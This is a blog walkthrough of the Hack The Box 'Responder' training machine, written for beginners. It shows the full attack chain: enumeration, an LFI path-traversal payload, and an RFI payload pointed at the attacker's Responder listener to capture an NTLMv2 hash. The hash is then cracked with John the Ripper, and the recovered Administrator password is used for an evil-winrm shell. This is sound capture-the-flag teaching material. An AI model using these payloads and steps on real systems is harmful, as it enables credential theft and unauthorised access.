<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Responder - Walkthrough | Ee-Vah?</title><meta name=keywords content="htb,walkthrough,responder,tier-1,winrm,web,network,custom-applications,protocols,xampp,smb,responder,php,reconnaissance,password-cracking,hash-capture,remote-file-inclusion,remote-code-execution"><meta name=description content="The aim of this walkthrough is to provide help with the Responder machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta name=author content="bluewalle"><link rel=canonical href=https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/responder/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bluewalle.github.io/main/img/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://bluewalle.github.io/main/img/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bluewalle.github.io/main/img/favicon-32x32.png><link rel=apple-touch-icon href=https://bluewalle.github.io/main/img/apple-touch-icon.png><link rel=mask-icon href=https://bluewalle.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - Responder - Walkthrough"><meta property="og:description" content="The aim of this walkthrough is to provide help with the Responder machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta property="og:type" content="article"><meta property="og:url" content="https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/responder/"><meta property="og:image" content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-06T12:00:00+00:00"><meta property="article:modified_time" content="2023-05-06T12:00:00+00:00"><meta property="og:site_name" content="Just Keep Swimming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB - Responder - Walkthrough"><meta name=twitter:description content="The aim of this walkthrough is to provide help with the Responder machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.
SETUP There are a couple of ways to connect to the target machine."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bluewalle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Responder - Walkthrough","item":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/responder/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Responder - Walkthrough","name":"HTB - Responder - Walkthrough","description":"The aim of this walkthrough is to provide help with the Responder machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.\nSETUP There are a couple of ways to connect to the target machine.","keywords":["htb","walkthrough","responder","tier-1","winrm","web","network","custom-applications","protocols","xampp","smb","responder","php","reconnaissance","password-cracking","hash-capture","remote-file-inclusion","remote-code-execution"],"articleBody":"The aim of this walkthrough is to provide help with the Responder machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.\nSETUP There are a couple of ways to connect to the target machine. The one we will be using throughout this walkthrough is via the provided pwnbox.\nOnce our connection is taken care of, we spawn the target machine.\nAlso, not required, but it is possible to set an environmental variable containing our target host’s IP address. Once set, we can easily access it by prepending a $ to our variable name.\n┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $rhost= ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ echo $rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ We could use the unset command to remove it after we no longer need it.\n┌─[✗]─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $unset rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ TASK 1 Question: When visiting the web service using the IP address, what is the domain that we are being redirected to?\nAs always, we start our journey with a quick recon.\n┌─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop/responder] └──╼ $nmap -p- -sV $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 13:38 BST Nmap scan report for 10.129.95.234 Host is up (0.014s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 183.28 seconds ┌─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop/responder] └──╼ $ As we can see, only two ports are reported open on our target machine. One way to check out the reported web server is by using our browser and inputting our target machine’s IP.\nThe first thing we might notice is our browser being redirected to a web page called unika.htb.\nThe second one might be, that trying to load up - unika.htb - in our browser does not work and our browser indicates a Server Not Found error.\nTo work around this, we add the following lines to our host configuration file. For the pwnbox (parrot os - debian base), ours is sitting at /etc/hosts.\n# mapping htb_starting-point_tier-1_responder's IP to hostname unika.htb Once the host name resolution is fixed, opening the webpage in our browser will work as usual.\nunika.htb\nTASK 2 Question: Which scripting language is being used on the server to generate webpages?\nStill in our initial recon phase, we could use a tool called whatweb to solve this task.\nIt is always a good idea to first we check out the tool’s man page (man whatweb) before using it.\nWHATWEB(1) General Commands Manual WHATWEB(1) NAME WhatWeb - Next generation Web scanner. Identify technologies used by websites. SYNOPSIS whatweb [options] DESCRIPTION WhatWeb identifies websites. It's goal is to answer the question, \"What is that Web‐ site?\". WhatWeb recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices. WhatWeb has over 1800 plugins, each to recognise something different. WhatWeb also identifies version numbers, email addresses, ac‐ count ID's, web framework modules, SQL errors, and more. ... Scanning our target provides us not only with the current task’s answer, but it also highlights that there is a redirection set in place.\n┌─[htb-bluewalle@htb-ktydnkgvcj]─[~/Desktop] └──╼ $whatweb $rhost http://10.129.163.153 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1], IP[10.129.163.153], Meta-Refresh-Redirect[http://unika.htb/], OpenSSL[1.1.1m], PHP[8.1.1], X-Powered-By[PHP/8.1.1] ERROR Opening: http://unika.htb/ - no address for unika.htb ┌─[htb-bluewalle@htb-ktydnkgvcj]─[~/Desktop] └──╼ $ On the same note, running gobuster might reveal some interesting pages…\n┌─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop/responder] └──╼ $gobuster dir -u http://unika.htb/ -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://unika.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/05/07 14:23:53 Starting gobuster in directory enumeration mode =============================================================== /.hta (Status: 403) [Size: 298] /.htpasswd (Status: 403) [Size: 298] /.htaccess (Status: 403) [Size: 298] /aux (Status: 403) [Size: 298] /cgi-bin/ (Status: 403) [Size: 298] /com2 (Status: 403) [Size: 298] /com1 (Status: 403) [Size: 298] /com3 (Status: 403) [Size: 298] /con (Status: 403) [Size: 298] /css (Status: 301) [Size: 328] [--\u003e http://unika.htb/css/] /img (Status: 301) [Size: 328] [--\u003e http://unika.htb/img/] /inc (Status: 301) [Size: 328] [--\u003e http://unika.htb/inc/] /index.php (Status: 200) [Size: 46453] /js (Status: 301) [Size: 327] [--\u003e http://unika.htb/js/] /licenses (Status: 403) [Size: 417] /lpt1 (Status: 403) [Size: 298] /lpt2 (Status: 403) [Size: 298] /examples (Status: 503) [Size: 398] /nul (Status: 403) [Size: 298] /phpmyadmin (Status: 403) [Size: 417] /prn (Status: 403) [Size: 298] /server-info (Status: 403) [Size: 417] /server-status (Status: 403) [Size: 417] /webalizer (Status: 403) [Size: 417] =============================================================== 2023/05/07 14:24:00 Finished =============================================================== ┌─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop/responder] └──╼ $ Well, nothing really stands out at first look, so we continue with our recon.\nphp\nTASK 3 Question: What is the name of the URL parameter which is used to load different language versions of the webpage?\nHeading over to our target's website and looking around a bit, we might notice that trying out the different langues results some interesting changes in the url.\npage\nTASK 4 Question: Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability:\n“french.html” “//10.10.14.6/somefile” “../../../../../../../../windows/system32/drivers/etc/hosts” “minikatz.exe” We can check if the webpage location we found is truly vulnerable against an LFI by trying to access one of the local files on the target that is serving the webpage.\nBut for that, we first need to know where exactly on the target we are located at. So we first try to access the current directory (./) and hope that the error messages may leak some location data.\nWe could do this by either continue using our browser and modifying our url to http://unika.htb/index.php?page=./, or by using curl (check out it’s man page for further info).\n┌─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop/responder] └──╼ $curl http://unika.htb/index.php?page=./ Warning: include(C:\\xampp\\htdocs): Failed to open stream: Permission denied in C:\\xampp\\htdocs\\index.php on line 11\nWarning: include(): Failed opening './' for inclusion (include_path='\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\index.php on line 11\n┌─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop/responder] └──╼ $ Looking at the output, we can guess that the file that we actually tried to access must be located somewhere in the C:\\xampp\\htdocs\\. or in the C:\\xampp\\php\\. directory.\nSo to traverse through the directories and access the host file on the target, we must go (at least) 2 times backwards and then use the host file’s path.\n┌─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop/responder] └──╼ $curl http://unika.htb/index.php?page=../../windows/system32/drivers/etc/hosts # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. #\t127.0.0.1 localhost #\t::1 localhost ┌─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop/responder] └──╼ $ Great, we just found a LFI vulnerability.\n../../../../../../../../windows/system32/drivers/etc/hosts\nTASK 5 Question: Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability:\n“french.html” “//10.10.14.6/somefile” “../../../../../../../../windows/system32/drivers/etc/hosts” “minikatz.exe” Turning off the HTTP toggle in the /usr/share/responder/Responder.conf file should enable us to 'host' our responder on port 80.\nOnce we ran it so that we can start listening to events, there will be a welcome message displaying it’s running configuration. Importantly, it also contains the IP address via it is made accessible.\n┌─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop] └──╼ $sudo responder -I tun0 __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR \u0026 MDNS Responder 3.0.6.0 Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C [+] Poisoners: LLMNR [ON] NBT-NS [ON] DNS/MDNS [ON] [+] Servers: HTTP server [OFF] HTTPS server [ON] WPAD proxy [OFF] Auth proxy [OFF] SMB server [ON] Kerberos server [ON] SQL server [ON] FTP server [ON] IMAP server [ON] POP3 server [ON] SMTP server [ON] DNS server [ON] LDAP server [ON] RDP server [ON] DCE-RPC server [ON] WinRM server [ON] [+] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF] [+] Poisoning Options: Analyze Mode [OFF] Force WPAD auth [OFF] Force Basic Auth [OFF] Force LM downgrade [OFF] Fingerprint hosts [OFF] [+] Generic Options: Responder NIC [tun0] Responder IP [10.10.14.30] Challenge set [random] Don't Respond To Names ['ISATAP'] [+] Current Session Variables: Responder Machine Name [WIN-MW3EU9AUBEK] Responder Domain Name [9LC1.LOCAL] Responder DCE-RPC Port [48718] [+] Listening for events... We feed this address to our target via the LFI vulnerability we just discovered, so that when our target tries to include the file we provided, it will automatically try to authenticate against our responder.\n┌─[✗]─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop/responder] └──╼ $curl http://unika.htb/index.php?page=//10.10.14.30/somefile Warning: include(\\\\10.10.14.30\\SOMEFILE): Failed to open stream: Permission denied in C:\\xampp\\htdocs\\index.php on line 11\nWarning: include(): Failed opening '//10.10.14.30/somefile' for inclusion (include_path='\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\index.php on line 11\n┌─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop/responder] └──╼ $ And since our responder is already listening, we will catch not only the username that our target provides, but it’s response to our NTLM challenge too.\n[+] Listening for events... [SMB] NTLMv2-SSP Client : 10.129.95.234 [SMB] NTLMv2-SSP Username : RESPONDER\\Administrator [SMB] NTLMv2-SSP Hash : Administrator::RESPONDER:a8750f2f141730ce:206BE3774A31A5055156CDBD66EC79B2:01010000000000000060F0D3FC80D90190C13FA75A83A9BD000000000200080039004C004300310001001E00570049004E002D004D005700330045005500390041005500420045004B0004003400570049004E002D004D005700330045005500390041005500420045004B002E0039004C00430031002E004C004F00430041004C000300140039004C00430031002E004C004F00430041004C000500140039004C00430031002E004C004F00430041004C00070008000060F0D3FC80D901060004000200000008003000300000000000000001000000002000004D6B32FFC31E455834C10B1E7584A0120257353A272A5BE624157BBD172E4B180A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330030000000000000000000 [+] Exiting... ┌─[✗]─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop] └──╼ $ Great, now we have a NTLMv2 hash/NTLMv2 challenge and response to play around with.\n//10.10.14.6/somefile\nTASK 6 Question: What does NTLM stand for?\nLook it up on the internet.\nnew technology lan manager\nTASK 7 Question: Which flag do we use in the Responder utility to specify the network interface?\nSince no man page is available for responder we check out it’s help options.\n─[htb-bluewalle@htb-otcbrtzpuj]─[~/workspace] └──╼ $responder responder responder-DHCP_Auto responder-MultiRelay responder-BrowserListener responder-FindSQLSrv responder-RunFinger responder-DHCP responder-Icmp-Redirect ┌─[htb-bluewalle@htb-otcbrtzpuj]─[~/workspace] └──╼ $man responder No manual entry for responder ┌─[✗]─[htb-bluewalle@htb-otcbrtzpuj]─[~/workspace] └──╼ $responder --help __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR \u0026 MDNS Responder 3.0.6.0 Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C Usage: responder -I eth0 -w -r -f or: responder -I eth0 -wrf Options: --version show program's version number and exit -h, --help show this help message and exit -A, --analyze Analyze mode. This option allows you to see NBT-NS, BROWSER, LLMNR requests without responding. -I eth0, --interface=eth0 Network interface to use, you can use 'ALL' as a wildcard for all interfaces -i 10.0.0.21, --ip=10.0.0.21 Local IP to use (only for OSX) -e 10.0.0.22, --externalip=10.0.0.22 Poison all requests with another IP address than Responder's one. -b, --basic Return a Basic HTTP authentication. Default: NTLM -r, --wredir Enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network. Default: False -d, --NBTNSdomain Enable answers for netbios domain suffix queries. Answering to domain suffixes will likely break stuff on the network. Default: False -f, --fingerprint This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query. -w, --wpad Start the WPAD rogue proxy server. Default value is False -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY Upstream HTTP proxy used by the rogue WPAD Proxy for outgoing requests (format: host:port) -F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file retrieval. This may cause a login prompt. Default: False -P, --ProxyAuth Force NTLM (transparently)/Basic (prompt) authentication for the proxy. WPAD doesn't need to be ON. This option is highly effective when combined with -r. Default: False --lm Force LM hashing downgrade for Windows XP/2003 and earlier. Default: False -v, --verbose Increase verbosity. ┌─[htb-bluewalle@htb-otcbrtzpuj]─[~/workspace] └──╼ $ We use this flag in TASK5 to start our responder with.\n-I\nTASK 8 Question: There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.\nAgain, we look it up online.\njohn the ripper\nTASK 9 Question: What is the password for the administrator user?\nTo get the password belonging to the administrator user we will have to crack the collected NTLM hash from TASK5.\nTo do that, first we have to save the hash into a file.\n┌─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop/responder] └──╼ $echo \"Administrator::RESPONDER:a8750f2f141730ce:206BE3774A31A5055156CDBD66EC79B2:01010000000000000060F0D3FC80D90190C13FA75A83A9BD000000000200080039004C004300310001001E00570049004E002D004D005700330045005500390041005500420045004B0004003400570049004E002D004D005700330045005500390041005500420045004B002E0039004C00430031002E004C004F00430041004C000300140039004C00430031002E004C004F00430041004C000500140039004C00430031002E004C004F00430041004C00070008000060F0D3FC80D901060004000200000008003000300000000000000001000000002000004D6B32FFC31E455834C10B1E7584A0120257353A272A5BE624157BBD172E4B180A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330030000000000000000000\" \u003e ntlm_hash ┌─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop/responder] └──╼ $ Then we run john with the rockyou wordlist on our hash.\n┌─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop/responder] └──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt ntlm_hash Using default input encoding: UTF-8 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64]) No password hashes left to crack (see FAQ) ┌─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop/responder] └──╼ $ If the password is found but not displayed anymore (only displayed at first run), we can check it directly.\n┌─[✗]─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop/responder] └──╼ $john --show ntlm_hash Administrator:badminton:RESPONDER:a8750f2f141730ce:206BE3774A31A5055156CDBD66EC79B2:01010000000000000060F0D3FC80D90190C13FA75A83A9BD000000000200080039004C004300310001001E00570049004E002D004D005700330045005500390041005500420045004B0004003400570049004E002D004D005700330045005500390041005500420045004B002E0039004C00430031002E004C004F00430041004C000300140039004C00430031002E004C004F00430041004C000500140039004C00430031002E004C004F00430041004C00070008000060F0D3FC80D901060004000200000008003000300000000000000001000000002000004D6B32FFC31E455834C10B1E7584A0120257353A272A5BE624157BBD172E4B180A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330030000000000000000000 1 password hash cracked, 0 left ┌─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop/responder] └──╼ $ badminton\nTASK 10 Question: We’ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?\nSince we still have the nmap results from TASK1, the answer is simple.\n5985\nSUBMIT FLAG Question: Submit root flag\ncollected credentials in TASK9 username Administrator password badminton We use the credentials we obtained in TASK9 to access the target via the winrm service. Once connected, our flag is located at C:\\Users\\mike\\Desktop\\flag.txt.\n┌─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop/responder] └──╼ $evil-winrm -i $rhost -u Administrator -p badminton -P 5985 Evil-WinRM shell v3.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e cd ..\\..\\ *Evil-WinRM* PS C:\\Users\u003e ls Directory: C:\\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 3/9/2022 5:35 PM Administrator d----- 3/9/2022 5:33 PM mike d-r--- 10/10/2020 12:37 PM Public *Evil-WinRM* PS C:\\Users\u003e cd mike *Evil-WinRM* PS C:\\Users\\mike\u003e ls Directory: C:\\Users\\mike Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 3/10/2022 4:51 AM Desktop *Evil-WinRM* PS C:\\Users\\mike\u003e cd Desktop *Evil-WinRM* PS C:\\Users\\mike\\Desktop\u003e ls Directory: C:\\Users\\mike\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 3/10/2022 4:50 AM 32 flag.txt *Evil-WinRM* PS C:\\Users\\mike\\Desktop\u003e cat flag.txt *Evil-WinRM* PS C:\\Users\\mike\\Desktop\u003e exit Info: Exiting with code 0 ┌─[htb-bluewalle@htb-lqivhnlwpy]─[~/Desktop/responder] └──╼ $ flag\nCongratulations, we just successfully pwned the target machine. All we have left to do now is to terminate the target box (if not terminated automatically) before we continue with the next box!\n","wordCount":"2427","inLanguage":"en","datePublished":"2023-05-06T12:00:00Z","dateModified":"2023-05-06T12:00:00Z","author":{"@type":"Person","name":"bluewalle"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/responder/"},"publisher":{"@type":"Organization","name":"Ee-Vah?","logo":{"@type":"ImageObject","url":"https://bluewalle.github.io/main/img/favicon.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bluewalle.github.io/ accesskey=h title="Just Keep Swimming (Alt + H)"><img src=https://bluewalle.github.io/apple-touch-icon.png alt aria-label=logo height=35>Just Keep Swimming</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://bluewalle.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://bluewalle.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://bluewalle.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bluewalle.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://bluewalle.github.io/posts/>Posts</a></div><h1 class=post-title>HTB - Responder - Walkthrough</h1><div class=post-meta><span title='2023-05-06 12:00:00 +0000 +0000'>May, 2023</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;2427 words&nbsp;·&nbsp;bluewalle</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#setup><strong>SETUP</strong></a></li><li><a href=#task-1><strong>TASK 1</strong></a></li><li><a href=#task-2><strong>TASK 2</strong></a></li><li><a href=#task-3><strong>TASK 3</strong></a></li><li><a href=#task-4><strong>TASK 4</strong></a></li><li><a href=#task-5><strong>TASK 5</strong></a></li><li><a href=#task-6><strong>TASK 6</strong></a></li><li><a href=#task-7><strong>TASK 7</strong></a></li><li><a href=#task-8><strong>TASK 8</strong></a></li><li><a href=#task-9><strong>TASK 9</strong></a></li><li><a href=#task-10><strong>TASK 10</strong></a></li><li><a href=#submit-flag><strong>SUBMIT FLAG</strong></a></li></ul></nav></div></details></div><div class=post-content><p>The aim of this walkthrough is to provide help with the <strong>Responder</strong> machine on the <a href=https://hackthebox.com title="Hack The Box website">Hack The Box website</a>. Please <strong>note</strong> that no <strong>flags</strong> are directly provided here. Moreover, <strong>be aware</strong> that this is only <strong>one</strong> of the <strong>many</strong> ways to solve the challenges.</p><p>It belongs to a series of tutorials that aim to help out complete beginners with finishing the <a href=https://app.hackthebox.com/starting-point title="HTB Starting Point">Starting Point</a> <strong>TIER 1</strong> challenges.</p><h2 id=setup><strong>SETUP</strong><a hidden class=anchor aria-hidden=true href=#setup>#</a></h2><p>There are a couple of ways to <strong>connect</strong> to the <strong>target machine</strong>. The one we will be using <strong>throughout</strong> this <strong>walkthrough</strong> is via the provided <strong>pwnbox</strong>.</p><p>Once our <strong>connection</strong> is taken care of, we <strong>spawn</strong> the <strong>target</strong> <strong>machine</strong>.</p><p>Also, not required, but it is possible to set an <strong>environmental</strong> variable containing our <strong>target host&rsquo;s</strong> IP address. Once set, we can easily <strong>access</strong> it by prepending a <em>$</em> to our variable name.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$rhost</span><span class=o>=</span>&lt;target-hosts-ip&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $ <span class=nb>echo</span> <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>&lt;target-hosts-ip&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>We could use the <em><strong>unset</strong></em> command to remove it after we no longer need it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$unset</span> rhost 
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
